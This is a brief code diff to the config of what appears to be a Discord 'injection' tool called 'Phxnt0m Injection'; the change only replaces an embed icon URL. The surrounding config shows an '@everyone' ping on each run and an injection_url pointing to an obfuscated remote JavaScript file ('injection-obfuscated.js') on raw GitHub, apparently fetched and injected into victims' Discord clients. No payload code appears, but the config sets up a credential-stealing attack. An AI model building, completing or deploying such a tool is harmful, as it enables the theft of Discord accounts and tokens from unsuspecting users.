@@ -13,7 +13,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Phxnt0m Injection', 
-  embed_icon: 'https://ibb.co/zrZqkDF',
+  embed_icon: 'https://cdn.discordapp.com/attachments/1203719977656651919/1203879502699167844/112121.jpg?ex=65d2b328&is=65c03e28&hm=52b1af3b0a44be8f3ee0d509499a4af85741d2f715f5a4a5a811e272b1fd46f7&',
   embed_color: 16777215, 
   injection_url: 'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js', 
 
